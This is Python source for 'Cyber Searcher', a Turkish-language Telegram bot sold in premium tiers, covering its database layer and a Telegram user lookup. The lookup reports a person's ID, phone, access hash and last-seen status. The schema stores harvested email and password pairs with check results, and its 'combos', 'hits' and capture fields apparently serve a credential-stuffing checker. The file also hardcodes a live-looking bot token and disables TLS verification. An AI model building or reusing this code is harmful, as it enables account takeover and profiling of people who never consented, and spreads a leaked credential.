# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║         CYBER SEARCHER v4.4 — FULL PRODUCTION           ║
# ║              Developer: @hackledin                       ║
# ║  🎵 Müzik + 🎥 Video (POT ile Bot Koruması Aşıldı)      ║
# ║  🆔 Telegram ID Sorgu (gettg.id API) — DÜZELTİLDİ!      ║
# ╚══════════════════════════════════════════════════════════╝
import telebot
import requests
import os
import threading
import time
import json
import sqlite3
import re
import urllib3
import subprocess
import sys
import uuid
import queue
from pathlib import Path
from datetime import datetime
from random import choice, randint
from string import ascii_lowercase
from urllib.parse import quote
from telebot.types import (
InlineKeyboardMarkup, InlineKeyboardButton,
ReplyKeyboardMarkup, KeyboardButton, LabeledPrice
)
from yt_dlp import YoutubeDL
import yt_dlp
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional

# ── EXIF / PIL ────────────────────────────────────────────────
try:
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("[UYARI] Pillow kurulu değil! Kurmak için: pip install Pillow")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════
BOT_TOKEN     = "7885601619:AAFDmzHEl8SymvmrBNXjbhiBH3qHZhCYatQ"
ADMIN_ID      = 8573809926
DB_PATH       = "cyber_searcher.db"
BOT_REGISTRY_FILE = "bot_registry.json"
PREMIUM_PRICE = 400
OSINT_PRICE = 200
FREE_CHECK_LIMIT = 3000
PREMIUM_CHECK_LIMIT = 999999
FREE_CAPTURE_LIMIT = 3
PREMIUM_CAPTURE_LIMIT = 999
FREE_KEYWORD_LIMIT = 3
PREMIUM_KEYWORD_LIMIT = 999
SMS_COUNT = 41

# ══════════════════════════════════════════════════════════════
#  🆔 TELEGRAM ID SORGU (gettg.id API)
# ══════════════════════════════════════════════════════════════
TGID_API_BASE          = "https://www.gettg.id/api/search?username="
TGID_FREE_LIMIT        = 5
TGID_PACKAGE_25        = 25
TGID_PACKAGE_50        = 50
TGID_PACKAGE_100       = 100
TGID_PRICE_25          = 89
TGID_PRICE_50          = 180
TGID_PRICE_100         = 250

# ══════════════════════════════════════════════════════════════
#  YT-DLP POT PROVIDER AYARI
# ══════════════════════════════════════════════════════════════
POT_PROVIDER_URL = "http://127.0.0.1:4416"

def _ytdlp_common_opts():
    return {
        'noplaylist': True,
        'quiet': True,
        'no_warnings': True,
        'socket_timeout': 30,
        'retries': 3,
        'fragment_retries': 3,
        'ignoreerrors': False,
        'extractor_args': {
            'youtubepot-bgutilhttp': {
                'base_url': [POT_PROVIDER_URL]
            }
        },
    }

# ══════════════════════════════════════════════════════════════
#  DATABASE FUNCTIONS
# ══════════════════════════════════════════════════════════════
def db_init():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT DEFAULT '',
        first_name TEXT DEFAULT '',
        join_date TEXT DEFAULT '',
        total_checks INTEGER DEFAULT 0,
        total_combos INTEGER DEFAULT 0,
        is_premium INTEGER DEFAULT 0,
        is_premium_osint INTEGER DEFAULT 0,
        premium_date TEXT DEFAULT '',
        premium_osint_date TEXT DEFAULT '',
        language TEXT DEFAULT 'tr',
        api_pref INTEGER DEFAULT 0,
        keywords TEXT DEFAULT 'tiktok,instagram,netflix',
        is_banned INTEGER DEFAULT 0,
        ban_reason TEXT DEFAULT '',
        capture_used INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS premium_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        package TEXT,
        amount INTEGER,
        date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS daily_usage (
        user_id INTEGER,
        date TEXT,
        checks INTEGER DEFAULT 0,
        hits INTEGER DEFAULT 0,
        PRIMARY KEY (user_id, date)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS hotmail_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        email TEXT,
        password TEXT,
        status TEXT,
        detail TEXT,
        date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_users (
        user_id INTEGER PRIMARY KEY,
        free_used INTEGER DEFAULT 0,
        query_balance INTEGER DEFAULT 0,
        total_queries INTEGER DEFAULT 0,
        tgid_last_query TEXT DEFAULT ''
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        target TEXT,
        status TEXT,
        detail TEXT,
        date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_purchases (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        package TEXT,
        queries INTEGER,
        stars INTEGER,
        date TEXT
    )''')
    conn.commit()
    conn.close()

db_init()

def db_get(user_id, col):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(f"SELECT {col} FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone()
        conn.close()
        return r[0] if r else None
    except:
        return None

def db_set(user_id, col, val):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(f"UPDATE users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit()
        conn.close()
    except:
        pass

def add_user(user_id, username="", first_name=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id,username,first_name,join_date) VALUES (?,?,?,?)",
                  (user_id, username, first_name, datetime.now().strftime("%Y-%m-%d %H:%M")))
        conn.commit()
        conn.close()
    except:
        pass

def is_premium(user_id):
    try:
        return db_get(user_id, "is_premium") == 1
    except:
        return False

def is_premium_osint(user_id):
    try:
        return db_get(user_id, "is_premium_osint") == 1
    except:
        return False

def is_banned(user_id):
    try:
        return db_get(user_id, "is_banned") == 1
    except:
        return False

def get_ban_reason(user_id):
    try:
        reason = db_get(user_id, "ban_reason")
        return reason or "Belirtilmemiş"
    except:
        return "Belirtilmemiş"

def set_premium(user_id, username=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium=1, premium_date=? WHERE user_id=?", (now, user_id))
        c.execute("INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
                  (user_id, username, "HOTMAIL", PREMIUM_PRICE, now))
        conn.commit()
        conn.close()
        print(f"[PREMIUM] Hotmail Premium verildi: {user_id} - {username}")
        return True
    except Exception as e:
        print(f"[PREMIUM ERROR] set_premium: {e}")
        return False

def set_premium_osint(user_id, username=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium_osint=1, premium_osint_date=? WHERE user_id=?", (now, user_id))
        c.execute("INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
                  (user_id, username, "OSINT", OSINT_PRICE, now))
        conn.commit()
        conn.close()
        print(f"[PREMIUM] OSINT Premium verildi: {user_id} - {username}")
        return True
    except Exception as e:
        print(f"[PREMIUM ERROR] set_premium_osint: {e}")
        return False

def remove_premium(user_id):
    db_set(user_id, "is_premium", 0)
    db_set(user_id, "premium_date", "")

def remove_premium_osint(user_id):
    db_set(user_id, "is_premium_osint", 0)
    db_set(user_id, "premium_osint_date", "")

def get_user_stats(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT total_checks,total_combos,join_date,is_premium,is_premium_osint,premium_date,premium_osint_date,username,first_name,keywords,is_banned,ban_reason,capture_used FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone()
        conn.close()
        return r
    except:
        return None

def get_user_name(user_id):
    name = db_get(user_id, "first_name")
    if name:
        return name
    username = db_get(user_id, "username")
    if username:
        return f"@{username}"
    return str(user_id)

def get_user_keywords(user_id):
    try:
        keywords = db_get(user_id, "keywords")
        if keywords:
            return [k.strip().lower() for k in keywords.split(',') if k.strip()]
        return ["tiktok", "instagram", "netflix"]
    except:
        return ["tiktok", "instagram", "netflix"]

def set_user_keywords(user_id, keywords_list):
    db_set(user_id, "keywords", ','.join(keywords_list))

def can_add_keyword(user_id):
    keywords = get_user_keywords(user_id)
    if is_premium(user_id):
        return len(keywords) < PREMIUM_KEYWORD_LIMIT
    return len(keywords) < FREE_KEYWORD_LIMIT

def get_keyword_limit_text(user_id):
    if is_premium(user_id):
        return "♾️ Sınırsız"
    return f"{FREE_KEYWORD_LIMIT}"

def get_capture_used(user_id):
    try:
        return db_get(user_id, "capture_used") or 0
    except:
        return 0

def increment_capture_used(user_id):
    current = get_capture_used(user_id)
    db_set(user_id, "capture_used", current + 1)

def can_use_capture(user_id):
    if is_premium(user_id):
        return True
    return get_capture_used(user_id) < FREE_CAPTURE_LIMIT

def get_capture_limit_text(user_id):
    if is_premium(user_id):
        return "♾️ Sınırsız"
    return f"{FREE_CAPTURE_LIMIT - get_capture_used(user_id)}"

def get_daily_usage(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT checks, hits FROM daily_usage WHERE user_id=? AND date=?", (user_id, today))
        r = c.fetchone()
        conn.close()
        if r:
            return {"checks": r[0], "hits": r[1]}
        return {"checks": 0, "hits": 0}
    except:
        return {"checks": 0, "hits": 0}

def update_daily_usage(user_id, checks=0, hits=0):
    today = datetime.now().strftime("%Y-%m-%d")
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO daily_usage (user_id, date, checks, hits) VALUES (?, ?, ?, ?) "
                  "ON CONFLICT(user_id, date) DO UPDATE SET checks=checks+?, hits=hits+?",
                  (user_id, today, checks, hits, checks, hits))
        conn.commit()
        conn.close()
    except:
        pass

def save_hotmail_log(user_id, username, email, password, status, detail=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("INSERT INTO hotmail_logs (user_id, username, email, password, status, detail, date) VALUES (?,?,?,?,?,?,?)",
                  (user_id, username, email, password, status, detail, now))
        conn.commit()
        conn.close()
    except:
        pass

def get_hotmail_logs(limit=50):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id, username, email, password, status, detail, date FROM hotmail_logs ORDER BY date DESC LIMIT ?", (limit,))
        r = c.fetchall()
        conn.close()
        return r
    except:
        return []

def get_bot_stats():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT COUNT(*),SUM(is_premium),SUM(is_premium_osint),SUM(total_combos),SUM(total_checks) FROM users WHERE is_banned=0")
        r = c.fetchone()
        conn.close()
        return r
    except:
        return (0, 0, 0, 0, 0)

def get_all_users():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id,username,first_name,is_banned FROM users")
        r = c.fetchall()
        conn.close()
        return r
    except:
        return []

def find_user_by_username(username):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id,username,is_banned FROM users WHERE username=?", (username,))
        r = c.fetchone()
        conn.close()
        return r
    except:
        return None

def get_premium_logs(limit=20):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id,username,package,amount,date FROM premium_logs ORDER BY date DESC LIMIT ?", (limit,))
        r = c.fetchall()
        conn.close()
        return r
    except:
        return []

def update_stats(user_id, combos):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE users SET total_checks=total_checks+1, total_combos=total_combos+? WHERE user_id=?", (combos, user_id))
        conn.commit()
        conn.close()
    except:
        pass

def ban_user(user_id, reason="Kural ihlali"):
    db_set(user_id, "is_banned", 1)
    db_set(user_id, "ban_reason", reason)

def unban_user(user_id):
    db_set(user_id, "is_banned", 0)
    db_set(user_id, "ban_reason", "")

def get_banned_users():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id,username,first_name,ban_reason FROM users WHERE is_banned=1")
        r = c.fetchall()
        conn.close()
        return r
    except:
        return []

def api_pref(user_id):
    try:
        v = db_get(user_id, "api_pref")
        return v if v is not None else 0
    except:
        return 0

# ══════════════════════════════════════════════════════════════
#  🆔 TELEGRAM ID SORGU - VERİTABANI FONKSİYONLARI
# ══════════════════════════════════════════════════════════════
def tgid_init_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO tgid_users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except:
        pass

def tgid_get(user_id, col):
    try:
        tgid_init_user(user_id)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(f"SELECT {col} FROM tgid_users WHERE user_id=?", (user_id,))
        r = c.fetchone()
        conn.close()
        return r[0] if r else 0
    except:
        return 0

def tgid_set(user_id, col, val):
    try:
        tgid_init_user(user_id)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(f"UPDATE tgid_users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit()
        conn.close()
    except:
        pass

def tgid_get_free_used(user_id):
    return tgid_get(user_id, "free_used") or 0

def tgid_get_balance(user_id):
    return tgid_get(user_id, "query_balance") or 0

def tgid_get_total(user_id):
    return tgid_get(user_id, "total_queries") or 0

def tgid_can_query(user_id):
    if user_id == ADMIN_ID:
        return True, "admin"
    if is_premium(user_id):
        return True, "premium"
    free_used = tgid_get_free_used(user_id)
    if free_used < TGID_FREE_LIMIT:
        return True, "free"
    if tgid_get_balance(user_id) > 0:
        return True, "balance"
    return False, None

def tgid_use_query(user_id):
    if user_id == ADMIN_ID or is_premium(user_id):
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "unlimited"
    free_used = tgid_get_free_used(user_id)
    if free_used < TGID_FREE_LIMIT:
        tgid_set(user_id, "free_used", free_used + 1)
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "free"
    balance = tgid_get_balance(user_id)
    if balance > 0:
        tgid_set(user_id, "query_balance", balance - 1)
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "balance"
    return False, None

def tgid_add_balance(user_id, amount):
    current = tgid_get_balance(user_id)
    tgid_set(user_id, "query_balance", current + amount)

def tgid_log_query(user_id, username, target, status, detail=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO tgid_logs (user_id,username,target,status,detail,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, target, status, detail, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
    except:
        pass

def tgid_log_purchase(user_id, username, package, queries, stars):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO tgid_purchases (user_id,username,package,queries,stars,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, package, queries, stars, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
    except:
        pass

# ══════════════════════════════════════════════════════════════
#  🆔 TELEGRAM ID SORGU — API + NORMALIZE (v4.4)
# ══════════════════════════════════════════════════════════════
def tgid_normalize_response(raw):
    """Türkçe/İngilizce karışık anahtar isimlerini standarda çevirir."""
    if not isinstance(raw, dict):
        return raw
    mapping = {
        "doğrulandı": "verified",
        "dogrulandi": "verified",
        "yanlış": "attach_menu_enabled_disabled",
        "yanlis": "attach_menu_enabled_disabled",
    }
    return {mapping.get(k, k): v for k, v in raw.items()}


def tgid_clean_inner_json(s):
    """Bozuk JSON string'ini temizleyip dict döndürür."""
    # Standart parse
    try:
        return json.loads(s)
    except Exception:
        pass
    # Manuel temizle
    try:
        s = re.sub(r':\s*yanlış\b', ': false', s, flags=re.IGNORECASE)
        s = re.sub(r':\s*doğru\b', ': true', s, flags=re.IGNORECASE)
        s = re.sub(r':\s*"yanlış"', ': false', s)
        s = re.sub(r':\s*"doğru"', ': true', s)
        s = s.replace('"doğrulandı"', '"verified"')
        s = s.replace('"dogrulandi"', '"verified"')
        s = re.sub(r',\s*}', '}', s)
        s = re.sub(r',\s*]', ']', s)
        return json.loads(s)
    except Exception:
        return None


def tgid_api_search(username):
    """
    gettg.id API sorgusu.
    Hem kullanıcı adı hem sayısal ID kabul eder.
    Hem yeni (status/data) hem eski (durum/veri) formatı destekler.
    """
    try:
        username = username.strip().lstrip("@").strip()
        if not username:
            return False, "❌ Kullanıcı adı veya ID boş olamaz!"
        if len(username) < 2:
            return False, "❌ En az 2 karakter olmalı!"

        url = TGID_API_BASE + username
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
        }
        r = requests.get(url, headers=headers, timeout=25, verify=False)
        if r.status_code != 200:
            return False, f"❌ API Hatası: HTTP {r.status_code}"

        try:
            outer = r.json()
        except Exception:
            return False, f"❌ API geçersiz cevap:\n<code>{r.text[:300]}</code>"

        # ═══ FORMAT 1: YENİ — {"status": "success", "data": "{...}"} ═══
        if outer.get("status") == "success" and "data" in outer:
            inner_raw = outer.get("data", "")
            if isinstance(inner_raw, str):
                inner = tgid_clean_inner_json(inner_raw)
                if inner is None:
                    return False, ("⚠️ API cevabı ayrıştırılamadı.\n"
                                   "Sunucudan gelen veri bozuk olabilir, tekrar deneyin.")
            else:
                inner = inner_raw
            inner = tgid_normalize_response(inner)
            return True, inner

        # ═══ FORMAT 2: ESKİ — {"durum": "başarı", "veri": "{...}"} ═══
        if outer.get("durum") in ("başarı", "basarili"):
            inner_raw = outer.get("veri", "")
            if isinstance(inner_raw, str):
                inner = tgid_clean_inner_json(inner_raw)
                if inner is None:
                    return False, "⚠️ API iç verisi ayrıştırılamadı."
            else:
                inner = inner_raw
            inner = tgid_normalize_response(inner)
            return True, inner

        # ═══ FORMAT 3: Direkt kullanıcı datası ═══
        if "id" in outer and ("first_name" in outer or "username" in outer):
            outer = tgid_normalize_response(outer)
            return True, outer

        # ═══ Diğer durumlar ═══
        st = outer.get("status", outer.get("durum", "bilinmiyor"))
        if st == "pending":
            return False, ("⏳ <b>Sorgu Kuyruğa Alındı</b>\n"
                           "API şu an meşgul. Lütfen 10-15 saniye sonra tekrar dene.")
        return False, f"❌ Sonuç bulunamadı.\nDurum: <code>{st}</code>"

    except requests.exceptions.Timeout:
        return False, "⏰ Zaman aşımı! API yanıt vermedi."
    except requests.exceptions.ConnectionError:
        return False, "🌐 Bağlantı hatası!"
    except Exception as e:
        return False, f"❌ Beklenmeyen hata: <code>{e}</code>"


def tgid_build_txt_report(username, data, queried_by=""):
    """Emojili, düzenli, okunası TXT rapor üretir."""
    def b(v):
        return "✅ Evet" if v else "❌ Hayır"

    def s(v, default="—"):
        if v is None or v == "":
            return default
        return str(v)

    lines = []
    sep  = "═" * 55
    thin = "─" * 55

    # ════════ BAŞLIK ════════
    lines.append(sep)
    lines.append("        🆔 TELEGRAM ID SORGU RAPORU")
    lines.append("             🔎 gettg.id API")
    lines.append(sep)
    lines.append(f" 🎯 Sorgulanan   : @{username.lstrip('@')}")
    lines.append(f" 👤 Sorgulayan   : {queried_by}")
    lines.append(f" 📅 Tarih        : {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
    lines.append(sep)
    lines.append("")

    # ════════ 1. TEMEL BİLGİLER ════════
    lines.append(" ┌─────────────────────────────────────────────┐")
    lines.append(" │  👤 TEMEL KİMLİK BİLGİLERİ                  │")
    lines.append(" └─────────────────────────────────────────────┘")
    lines.append("")
    lines.append(f"  🆔 ID            : {s(data.get('id'))}")
    lines.append(f"  📛 Ad            : {s(data.get('first_name'))}")
    lines.append(f"  📛 Soyad         : {s(data.get('last_name'))}")
    lines.append(f"  🔗 Kullanıcı Adı : @{s(data.get('username'), 'Yok')}")
    lines.append(f"  📱 Telefon       : {s(data.get('phone'), 'Gizli / Yok')}")
    lines.append(f"  🌐 Dil Kodu      : {s(data.get('lang_code'), 'Belirsiz')}")
    lines.append(f"  🔑 Access Hash   : {s(data.get('access_hash'))}")
    lines.append("")

    # ════════ 2. HESAP TÜRÜ ════════
    lines.append(" ┌─────────────────────────────────────────────┐")
    lines.append(" │  🏷️ HESAP TÜRÜ & DURUM                     │")
    lines.append(" └─────────────────────────────────────────────┘")
    lines.append("")
    lines.append(f"  🤖 Bot mu?            : {b(data.get('bot'))}")
    lines.append(f"  ✅ Doğrulanmış        : {b(data.get('verified'))}")
    lines.append(f"  ⭐ Premium            : {b(data.get('premium'))}")
    lines.append(f"  🚨 Scam (Dolandırıcı) : {b(data.get('scam'))}")
    lines.append(f"  🎭 Fake (Sahte)       : {b(data.get('fake'))}")
    lines.append(f"  🛡️ Destek Hesabı      : {b(data.get('support'))}")
    lines.append(f"  🗑️ Silinmiş           : {b(data.get('deleted'))}")
    lines.append(f"  🚫 Kısıtlanmış        : {b(data.get('restricted'))}")
    lines.append(f"  📇 Rehberde Kayıtlı   : {b(data.get('contact'))}")
    lines.append(f"  🤝 Karşılıklı Kişi    : {b(data.get('mutual_contact'))}")
    lines.append(f"  💚 Yakın Arkadaş      : {b(data.get('close_friend'))}")
    lines.append("")

    # ════════ 3. PROFİL FOTOĞRAFI ════════
    lines.append(" ┌─────────────────────────────────────────────┐")
    lines.append(" │  📸 PROFİL FOTOĞRAFI                        │")
    lines.append(" └─────────────────────────────────────────────┘")
    lines.append("")
    photo = data.get("photo")
    if isinstance(photo, dict):
        lines.append(f"  🖼️ Photo ID    : {s(photo.get('photo_id'))}")
        lines.append(f"  🌐 DC ID       : {s(photo.get('dc_id'))}")
        lines.append(f"  🎬 Video mu?   : {b(photo.get('has_video'))}")
        lines.append(f"  🔒 Personal    : {b(photo.get('personal'))}")
    else:
        lines.append("  ⚠️ Profil fotoğrafı yok veya gizli")
    lines.append("")

    # ════════ 4. SON GÖRÜLME ════════
    lines.append(" ┌─────────────────────────────────────────────┐")
    lines.append(" │  🕐 SON GÖRÜLME DURUMU                     │")
    lines.append(" └─────────────────────────────────────────────┘")
    lines.append("")
    status = data.get("status", {})
    if isinstance(status, dict):
        st = status.get("_", "Bilinmiyor")
        status_map = {
            "UserStatusRecently":  "🟢 Son zamanlarda online",
            "UserStatusOnline":    "🟢 Şu an online",
            "UserStatusOffline":   "⚫ Çevrimdışı",
            "UserStatusLastWeek":  "🟡 Son bir hafta içinde",
            "UserStatusLastMonth": "🟠 Son bir ay içinde",
            "UserStatusEmpty":     "❓ Belirsiz",
        }
        lines.append(f"  📌 Durum       : {status_map.get(st, st)}")
        if "was_online" in status and status["was_online"]:
            try:
                was = datetime.fromtimestamp(status["was_online"]).strftime("%d.%m.%Y %H:%M:%S")
                lines.append(f"  🕰️ Son Görülme : {was}")
            except Exception:
                lines.append(f"  🕰️ Son Görülme : {status.get('was_online')}")
    else:
        lines.append("  ⚠️ Durum bilgisi yok")
    lines.append("")

    # ════════ 5. HİKAYELER ════════
    if data.get("stories_hidden") or data.get("stories_unavailable"):
        lines.append(" ┌─────────────────────────────────────────────┐")
        lines.append(" │  📖 HİKAYELER                               │")
        lines.append(" └─────────────────────────────────────────────┘")
        lines.append("")
        lines.append(f"  👻 Gizli       : {b(data.get('stories_hidden'))}")
        lines.append(f"  🚫 Erişilemez  : {b(data.get('stories_unavailable'))}")
        if data.get("stories_max_id"):
            lines.append(f"  🔢 Max ID      : {s(data.get('stories_max_id'))}")
        lines.append("")

    # ════════ 6. ALTERNATİF KULLANICI ADLARI ════════
    usernames = data.get("usernames", [])
    if usernames:
        lines.append(" ┌─────────────────────────────────────────────┐")
        lines.append(" │  🔗 ALTERNATİF KULLANICI ADLARI             │")
        lines.append(" └─────────────────────────────────────────────┘")
        lines.append("")
        for i, u in enumerate(usernames, 1):
            if isinstance(u, dict):
                aktif = "✅ Aktif" if u.get("active") else "❌ Pasif"
                lines.append(f"  {i}. @{u.get('username', '—')}  [{aktif}]")
            else:
                lines.append(f"  {i}. {u}")
        lines.append("")

    # ════════ 7. KISITLAMA SEBEPLERİ ════════
    reasons = data.get("restriction_reason", [])
    if reasons:
        lines.append(" ┌─────────────────────────────────────────────┐")
        lines.append(" │  🚫 KISITLAMA SEBEPLERİ                     │")
        lines.append(" └─────────────────────────────────────────────┘")
        lines.append("")
        for i, r in enumerate(reasons, 1):
            if isinstance(r, dict):
                lines.append(f"  {i}. [{r.get('platform', '—')}]")
                lines.append(f"     Sebep : {r.get('reason', '—')}")
                if r.get("text"):
                    lines.append(f"     Açıklama: {r.get('text')}")
            else:
                lines.append(f"  {i}. {r}")
        lines.append("")

    # ════════ 8. EMOJI DURUMU ════════
    if data.get("emoji_status"):
        lines.append(" ┌─────────────────────────────────────────────┐")
        lines.append(" │  😀 EMOJI DURUMU                            │")
        lines.append(" └─────────────────────────────────────────────┘")
        lines.append("")
        lines.append(f"  {data.get('emoji_status')}")
        lines.append("")

    # ════════ FOOTER ════════
    lines.append(sep)
    lines.append(" 📌 Bu rapor gettg.id API'si kullanılarak oluşturuldu.")
    lines.append(" 👨‍💻 Developer : @hackledin")
    lines.append(" 🛡️ Cyber Searcher v4.4")
    lines.append(sep)
    return "\n".join(lines)


def tgid_summary_caption(username, data, user_id):
    """Sorgu sonrası gönderilen caption — EMOJİLİ."""
    free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(user_id))
    balance   = tgid_get_balance(user_id)
    if user_id == ADMIN_ID:
        hak = "👑 Admin — Sınırsız"
    elif is_premium(user_id):
        hak = "⭐ Premium — Sınırsız"
    else:
        hak = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"

    ad       = data.get("first_name") or "—"
    soyad    = data.get("last_name") or ""
    isim     = f"{ad} {soyad}".strip() or "—"
    kadi     = data.get("username") or "Yok"
    user_id_ = data.get("id", "—")
    prem     = "⭐ Evet" if data.get("premium") else "❌ Hayır"
    ver      = "✅ Evet" if data.get("verified") else "❌ Hayır"
    bot_mu   = "🤖 Evet" if data.get("bot") else "👤 Hayır"
    scam     = "🚨 EVET" if data.get("scam") else "✅ Hayır"
    fake     = "🎭 EVET" if data.get("fake") else "✅ Hayır"

    return (
        f"✅ <b>Telegram ID Sorgu Başarılı!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>@{kadi}</b>\n"
        f"📛 İsim: <b>{isim}</b>\n"
        f"🆔 ID: <code>{user_id_}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⭐ Premium    : {prem}\n"
        f"✅ Doğrulanmış: {ver}\n"
        f"🤖 Bot        : {bot_mu}\n"
        f"🚨 Scam       : {scam}\n"
        f"🎭 Fake       : {fake}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 {hak}\n"
        f"📄 <i>Detaylı rapor TXT dosyasında</i>"
    )


def tgid_process_search(msg, bot_instance):
    """Kullanıcıdan gelen kullanıcı adını/ID'yi sorgular."""
    uid = msg.from_user.id
    username = msg.text.strip().lstrip("@").strip()

    if not username:
        bot_instance.reply_to(msg, "❌ Geçersiz kullanıcı adı veya ID!")
        return

    allowed, source = tgid_can_query(uid)
    if not allowed:
        free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
        bot_instance.reply_to(
            msg,
            f"❌ <b>Sorgu hakkınız kalmadı!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆓 Free kalan: <b>{free_left}</b>/{TGID_FREE_LIMIT}\n"
            f"💰 Bakiye: <b>{tgid_get_balance(uid)}</b>\n\n"
            f"💎 <b>Paket satın almak için aşağıdaki butona bas:</b>",
            reply_markup=tgid_packages_kb()
        )
        return

    wait = bot_instance.reply_to(msg, f"⏳ <code>@{username}</code> sorgulanıyor...\n<i>Lütfen bekle...</i>")

    success, data = tgid_api_search(username)
    if not success:
        try:
            bot_instance.edit_message_text(data, msg.chat.id, wait.message_id, parse_mode="HTML")
        except:
            bot_instance.send_message(msg.chat.id, data, parse_mode="HTML")
        tgid_log_query(uid, msg.from_user.username or "", username, "FAIL", str(data)[:100])
        return

    tgid_use_query(uid)

    queried_by = f"@{msg.from_user.username}" if msg.from_user.username else str(uid)
    report = tgid_build_txt_report(username, data, queried_by)
    fname = f"TG-ID_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    try:
        with open(fname, "w", encoding="utf-8") as f:
            f.write(report)
    except Exception as e:
        bot_instance.edit_message_text(
            f"❌ Rapor oluşturulamadı: <code>{e}</code>",
            msg.chat.id, wait.message_id, parse_mode="HTML"
        )
        return

    caption = tgid_summary_caption(username, data, uid)

    try:
        with open(fname, "rb") as f:
            bot_instance.send_document(msg.chat.id, f, caption=caption, parse_mode="HTML")
        bot_instance.delete_message(msg.chat.id, wait.message_id)
    except Exception as e:
        bot_instance.send_message(msg.chat.id, f"❌ Dosya gönderilemedi: <code>{e}</code>", parse_mode="HTML")
    finally:
        if os.path.exists(fname):
            try:
                os.remove(fname)
            except:
                pass

    tgid_log_query(uid, msg.from_user.username or "", username, "OK", f"ID={data.get('id')}")


